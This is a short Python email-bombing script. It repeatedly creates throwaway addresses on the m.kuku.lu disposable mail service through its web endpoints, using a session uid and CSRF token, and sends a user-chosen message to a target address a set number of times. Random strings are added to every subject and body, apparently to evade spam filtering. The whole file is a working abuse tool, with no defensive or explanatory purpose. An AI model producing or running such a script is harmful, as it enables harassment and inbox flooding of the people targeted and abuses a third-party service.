import requests,time,random,string

print("Please enter to Target Email")
tg = input()
print("Please enter to subject")
sj = input()
print("Please enter to message")
msg = input()
print("Please enter to repeats")
rp = int(input())
print("Please enter to delay")
delay = float(input())

uid = "uid"
token = "token"

def randomname(n):
   randlst = [random.choice(string.ascii_letters + string.digits) for i in range(n)]
   return ''.join(randlst)

for i in range(rp):
  add = requests.post(f"https://m.kuku.lu/index.php?action=addMailAddrByAuto&nopost=1&by_system=1&UID_enc={uid}&csrf_token_check={token}&_=1652588793012")
  
  address = add.text[3:]
  
  cookies = {
      'cookie_csrf_token': token,
      'cookie_uidenc_seted': uid
  }
  
  
  
  data = {
      'action': 'sendMail',
      'ajax': '1',
      'UID_enc': uid,
      'csrf_token_check': token,
      'sendmail_replymode': '',
      'sendmail_replynum': '',
      'sendtemp_hash': '7e23861b491455ed3186e90650889a33',
      'sendmail_from': address,
      'sendmail_from_radio': address,
      'sendmail_to': tg,
      'sendmail_subject': sj + " " + randomname(5),
      'sendmail_content': msg + " " + randomname(5),
      'sendmail_content_add': '',
      'file_hash': '7e23861b491455ed3186e90650889a33',
  }
  
  
  response = requests.post('https://m.kuku.lu/new.php', cookies=cookies,data=data)
  print(f"[+] Email sent by {address} to {tg}")
  time.sleep(delay)
